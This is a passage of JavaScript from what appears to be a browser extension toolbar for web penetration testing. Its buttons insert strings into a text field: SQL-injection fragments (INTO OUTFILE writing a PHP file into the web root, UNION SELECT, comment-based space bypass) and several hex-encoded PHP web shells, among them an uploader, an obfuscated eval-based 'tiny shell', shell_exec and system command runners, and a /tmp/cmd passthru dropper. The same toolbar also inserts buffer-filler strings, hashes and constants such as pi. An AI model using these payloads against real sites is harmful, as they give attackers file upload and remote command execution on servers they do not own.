					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '+INTO+OUTFILE+"/var/www/html/null.php"';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	$('#upscr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '0x3c3f706870206563686f202755706c6f616465723c62723e273b6563686f20273c62723e273b6563686f20273c666f726d20616374696f6e3d2222206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d6461746122206e616d653d2275706c6f61646572222069643d2275706c6f61646572223e273b6563686f20273c696e70757420747970653d2266696c6522206e616d653d2266696c65222073697a653d223530223e3c696e707574206e616d653d225f75706c2220747970653d227375626d6974222069643d225f75706c222076616c75653d2255706c6f6164223e3c2f666f726d3e273b69662820245f504f53545b275f75706c275d203d3d202255706c6f6164222029207b69662840636f707928245f46494c45535b2766696c65275d5b27746d705f6e616d65275d2c20245f46494c45535b2766696c65275d5b276e616d65275d2929207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d656c7365207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d7d3f3e';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	$('#tinys').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '0x3c3f706870a24735f3d27654e71565574464b777a415566522f7348364a37585a7a62524346746830777369744d48465747796c7a533557344e7055744c4d7259723964704e315a534a39304874656b707837376a6b4a43564f6279556d33457861326c4f41576965596c2b6b514a5a5738726f39654b5936616c4e715233757173413164744e4b697745614b6d567855756143566d53467a43634b726f2f4c4d51486b4f45773377626f713973524b6c2f62766f577470515a6f7677414a7a4471622f6578345630474c36796a326349773248417878383143687065436f64785a372f443143592b356366307175394e6f494d4b3053656b6834486e734579452f42484a673231417174694e4c71483839415361726677527a47587351656454376574326b547270614e764d7a315738476f7846534b6c534b5a3446784372666a56506d357553684d4a6a6f49737479566d49475642696c527641736564434c5673745138487a5138496a7a432b70787a517445525639586a35576c58484748754367624a672f436f316b7a435a524e46694d6236626f756662687a6c3675726d657a644230336d674767796a7966642b532b4d677a273ba6563686f28677a756e636f6d7072657373286261736536345f6465636f64652824735f2929293ba6572726f725f7265706f7274696e672830293ba6f625f737461727428293ba2f2f54494e59205348454c4c20207631204279207e7e52405a7e7ea24706173733d273833666533373462353331616363303837636130316232633635383435333839273b2f2f2044656661756c7420506173732069732072617a202020284368616e67652049742029a2473683d27654e727457473176347a59532f7077412b5138735431664a4238666162467373594676714f596d6342707533576b6d42765767684b4259644353744c676967356d797479763733444966566978386c757237312b757353577865484d63446a7a44446c6b7644435734512b47356c39647574653365683577726e2f73575a596d336e712f37753375634d5a356e4b552b4c344f694e486f6a49476d2b36376a75366556464c53445a6f657470622f6335663777775973355a615479543677375534547078774a51774c6f4142545143654d694957366659494f35355977686e382f6b7267723261365a2b5838495a5347506e574565566e3442637554594d344d33665030766d377166657a736a586232647257715349444c2b495974382f4952545a333934737875395a2b757236396359516e356b64436f4c484d2b4e45303661426e6b723338784f5866306a7833367a506e35786e47762f5a765a71663652444b5877667950626f514e31397346337232656e4679666f4179334f3054477434506e6c74654e506a6f396e304b3978567178597363616868717735466e4843724c62333671637265442b626f6e49526b6a543277614f477a6f4d463835645a7948534d4364466349466a30386f4b4b73497441644b6e544b5a566f304f3465533862426744446d6e2f7846775a6a50637845434f71433945644634374f6346573853666753556f69754452495071683369663665337965342f4d456e396634645044354c33782b4f4e524a62365464425a79422b4d476274392b5074486b4365494c574d6b344e734c37734a646d396f617a6f452b54747763733871314b41576a4e386a2b7954413944463433387a692b63465343344d2f6538486737634c4865565167556e79374d46414a58303545734269514854344833546d63697637774c7346573259723567736e742f6774524c50322f5670734f743758324370494c4142746e484e51466a46654a34626f41447743783263326c38422b7a674e64794c4e6148337256444d334375477a70324254304b67325767762b66655a5437324444305142654f79533336625872483839477a4a78317079302b516c4b3036624459516b6c6d4e4e4a58502b4735683867306f4a7353476d45424f73567a546955324a2b59706267456c2f586855465330752f4170526a76724e356c4a48786550782b4d727559374f324f6f384b324c4d3837444867384a394d716e5a65774d48485474437a524e623644727a6b484461797733512f757458502b6e364630414d7832684e33777659486743446f5878436b416d4c674377454f45697143354d73644f72345971335154784b496c424d524c6a48416a494f4a6b3635507a79324c45775463626d6f533137504d386242795143374667555166456a2b7879583144374c37724f71484a7542625a71314f654e4656697a4a6b705652466c6f553345424a67504f797841706d7578464c45754a412b49637951754d347a6175536c4938353547584a50674f2f6d4b46464255536f7664624e7137736c6a4573415942553048636c686968472f4e4b34444d676241742f66465959487879384e574a6676616b59384b4670534d484d6646384d5642455667626f305a78474c4b303568443974514749793964746c494e756d4d6741594d6938724a49797a6d4837773937394d436744326b77677a336737412f6f3361742f6b535261455a417078332b5938675966617967705a587a66747075615270676e67495a77563047754c425a5255666b78507a7743586b34764a69544d54795545774f3872674c6d48774931346a425651306b6c7a4944494850324951753058334d456c617970766c4c7a4236517436453459726c5a6f36417146334b6f6f56797859696b6272306538546f576a4b456a765a6553464c53384676784e616a4f7a7267555764644d314e384e33627854566c625548443071473374777372326a794351525246726c34677a594a3552497a374a4c737a3644396f6a77536359484a7a4b61506c4d4632785534454673495162376161547764346d474a484255444b3950746e2f58696a584672684849525665444c6c69634e6f7a63514f734755427841587463614d686d2f304256597172586c76756c58493633436143322f747665674a4c7a51377057626347336c5a45767750566563536b58345a37584749387a4a75533538776a42446f4a4c4e35566f432b31364e5a534c345572574b4b6a713232626a73435542555268417645424d474e445274616d6e324b356e686e76303739447a676a3043394c3944433236357a37574952486c566930695a66656c316d59466265435332366d35344649726e5354786b48502f762b622f61382f43706b774f58697a386a4e78727a54616d7547357576694d73533566397758466f74396d584f306d6236384958566d63334c7248683830615176632f784a634f34347035337356305034662b4f71763878503467504d58516c5462764630625666726e46686779307044416d68394b474a6b58652f74414c644b6b7a6a39394b776259374a446941506a47565457434f472b3357576a765936426e537341555a4f3474376f73654d54705777326d6c557435344e3167754e57687778636250683452674c4553664f4b6b686f65594c514b53575979765a6f4647795834577176304c74505937353551713738354c2b7447394f5470795848643663336232676478636e56314f6a70316a756e56616f755a7570384a6b6f53744b414647312b364b746546416131527355713745494b3338345565446d3739487650477172516a6b6b6c31554a4263302b324b64554471696f58394c5370716f63365a67416859347959556538512f32414a546e656c327a7772745a514141564e4b4647773673526645365757465a584c424f724c75497a68444370366654796767516c41355931456655594474494a5541427168356e6a674d4a2b33503367554475574a6544393438385a54785a75486c527a4d4659634278436f784143335a4d425a58395332516c665157503641425043344d356a6d62783045796a344a697139464b5567464547643474545430733572326d4f76556f5745704848573552507172436534332b7836652f4d55696e7050565554657656526131487366716567476663594d573874726f314f3761424a3945486350546b6e646d6a337a714a4b65384a68534871646735384b70774e4d46356b734b41707762372b6f45735561796c37384a58584e363471316e534e56425975554a73686c66596261586c7a734c4f4463395a6c4c6f44447367494f4348416f54326c377843444857636f474b6750414f385330645946757641376355566456323155564c4f77716d67627744463955745a676e4761394e565a6d326d664c71326b4d6d4844595572552f6576487633726b2f4b6f6b4a5a61513646565a366377774a453647626d3467375558585752304b4858577942704e4d6e3967734443674577447571394f617548472f746c647a3042424b3371526c515276524d6c514e3759766176574e5531776a6f726b7944686b4550487555643745524c422b734d50516b6d7763695734623641506642316d2b3149553163494e5071632f4c472b646d2b436a6933316b397934694c35495376432b74776e327138666c552b794a685645564a392b413174784753453d273ba6576616c28677a756e636f6d7072657373286261736536345f6465636f6465282473682929293ba3f3ea3c68723e3c68723e3d3d3d3d3d3d3d3d3d3d5468616e6b7320466f72205573696e672e3d3d3d3d3d3d3d3d3d3d3d3d3c2f626f64793ea3c2f68746d6c3e';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	$('#cmdscr').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '0x3c63656e7465723e203c68313e4578656375746520636f6d6d616e64733c2f68313e203c666f726d206d6574686f643d22504f53542220616374696f6e3d22223e203c696e70757420747970653d227465787422206e616d653d22636d642220706c616365686f6c6465723d224578656375746520436f6d6d616e6473223e203c696e70757420747970653d227375626d6974222076616c75653d223e3e223e203c2f666f726d3e203c3f7068702024636d64203d20245f504f53545b27636d64275d3b202465786563203d207368656c6c5f65786563282224636d6422293b206563686f20223c746578746172656120726f77733d2731352720636f6c733d273835273e24657865633c2f74657874617265613e223b203f3e';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	$('#phpb').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	$('#pbc').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '0x3c3f7068702024636d64203d20245f504f53545b27636d64275d3b73797374656d2824636d64293b3f3e';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
	$('#whoami').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<1;i++)
				{
					final1 += '0x3c3f7068702024633d666f70656e28272f746d702f636d64272c277727293b6677726974652824632c273c3f70687020706173737468727528245f4745545b22636d64225d293b3f3e27293b3f3e';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#unionselect').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var number = prompt("Enter the number of columns");

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
//s					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var number_cols = '';
				for(i=1;i<=number;i++)
				{
					if(i==number)
					{
						number_cols += i;
					}
					else
					{
						number_cols += i+',';
					}
				}

				var f1 = 'UNION SELECT ';

				var final1 = f1+number_cols;

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#spaceinline').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				var start1 = start;
				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start1 = get_cursor_pos(document.getElementById('text_field'));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

			    var hello1 = str;
			    var text = str;

	    		start = -1;
	    		var check = 0;
	    		var string = '';
	    		for(i=0;i<hello1.length;i++)
	    		{
	    			var substr = text.substring(i,i+1);
//	    			alert(substr);
	    			if(substr == ' ')
	    			{
//	    				alert(i);
//						var sub = text.substring(start,i);
//		    			start = i;
//	    				var string = sub.replace(' ','/**/');

						var qwe = text.substring(start+1,i);

						start = i;
//						alert(qwe);
//						qwe = qwe.replace(' ','/**/');
//						alert(qwe);
						string += qwe+'/**/';
//						alert(string);

	    				check = 1;
	    				var end = text.substring(i+1);
//	    				alert(end);
	    			}

	    		}

	    		if(check == 0)
	    		{
	    			end = hello1;
	    		}

//	    		alert(string);
	    		final1 = string+end;
//	    		alert(final1);
//	    		string = string + end;
//	    		alert(string);
//	    		document.cookie="mydata="+escape(string);
//	    		$('#text_field').prop('value',string);

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start1+final1.length;
// 				alert(start1+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start1, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

  $('#md5').click(function(){
//    alert(window.getSelection().toString());
//     $('#text_field').prop('value',hashed);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

			   var final1 = md6(str);
  
				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

	
			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});

  });

  $('#sha1').click(function(){

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

			   var final1 = sha2(str);
  
				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);
	
			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});


  });

  $('#rot13').click(function(){

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

			   var final1 = str_rot13(str);
  
				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

	
			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});


  });

  $('#as').click(function(){
    
		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

			  	var final1 = addslashes(str);
  
				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

	
			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});



  });

  $('#ss').click(function(){

		chrome.tabs.executeScript(null,
			{

			},
			function(){
//				window.getSelection().removeAllRanges();
//				document.selection.empty();
//				document.selection.clear();

//				var selection = window.getSelection();
  //              selection.deleteFromDocument ();
				
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start = get_cursor_pos(document.getElementById('text_field'));
				}

//				alert(0);
		 	    var final1 = stripslashes(str);
//		 	    alert(final1);
  
				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
 //				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});



  });



	$('#stripspace').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
	 			var str = inputstr.substring(start,end);
 
 				var start1 = start;
				if(str == '')
				{
					var str = window.prompt('No text was selected for requested action','String to use');
					var start1 = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

			    var hello1 = str;
			    var text = str;

	    		start = -1;
	    		var check = 0;
	    		var string = '';
	    		for(i=0;i<hello1.length;i++)
	    		{
	    			var substr = text.substring(i,i+1);
//	    			alert(substr);
	    			if(substr == ' ')
	    			{
//	    				alert(i);
//						var sub = text.substring(start,i);
//		    			start = i;
//	    				var string = sub.replace(' ','/**/');

						var qwe = text.substring(start+1,i);

						start = i;
//						alert(qwe);
						qwe = qwe.replace(' ','');
//						alert(qwe);
						string+= qwe;
//						string += qwe+'/**/';
//						alert(string);

	    				check = 1;
	    				var end = text.substring(i+1);
//	    				alert(end);
	    			}

	    		}

	    		if(check == 0)
	    		{
	    			end = hello1;
	    		}


//	    		alert(string);
	    		final1 = string+end;
//	    		alert(final1);
//	    		string = string + end;
//	    		alert(string);
//	    		document.cookie="mydata="+escape(string);
//	    		$('#text_field').prop('value',string);

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start1+final1.length;
// 				alert(start1+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start1, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});


	$('#pi').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1 = '3.14159265';

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#bigpi').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1 = '3.14159265358979323846264338327950288419716939937510';

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#phi').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1 = '1.618033988749895';

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#lorem').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1 = 'Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.';

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#fibonacci').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1 = '0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946, ...';

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#buffer128').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<128;i++)
				{
					final1 += 'A';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

		$('#buffer256').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<256;i++)
				{
					final1 += 'A';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});
			$('#buffer512').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<512;i++)
				{
					final1 += 'A';
				}


			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

		$('#buffer1024').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);


				var final1='';
				for(i=0;i<1024;i++)
				{
					final1 += 'A';
				}

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

		$('#buffer2048').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);
				
				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
				}

				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var final1='';
				for(i=0;i<2048;i++)
				{
					final1 += 'A';
				}

			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				var end_selection_after = start+final1.length;
// 				alert(start+':'+end_selection_after);
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";
		});
	});

	$('#buffercustom').click(function(){
//		alert(1);

		chrome.tabs.executeScript(null,
			{

			},
			function(){

				var start = document.getElementById('text_field').selectionStart;
				var end = document.getElementById('text_field').selectionEnd;
				var inputstr = $('#text_field').val();
				var str = inputstr.substring(start,end);

				if(str=='')
				{
					var start = get_cursor_pos(document.getElementById("text_field"));
//					alert(start);
				}

//				alert(start+':'+end);
				var remaining_start = inputstr.substring(0,start);
				var remaining_end = inputstr.substring(end);

				var length = window.prompt('Enter a value :');

//				alert(length);
				
				var text = '';

				for(i=0;i<length;i++)
				{
					text += 'A';
				}

				var final1 = text;

//				alert(remaining_start+':'+remaining_end);
			    var update = remaining_start+final1+remaining_end;
// 				document.cookie="mydata"+update;

 				$('#text_field').prop('value',update);
// 				document.cookie="mydata=";

 				var end_selection_after = start+final1.length;
				setInputSelection1(document.getElementById("text_field"), start, end_selection_after);

		});
	});

	$('#reverse').click(function(){

		chrome.tabs.executeScript(null,
			{

			},
			function(){
				var start = document.getElementById('text_field').selectionStart;
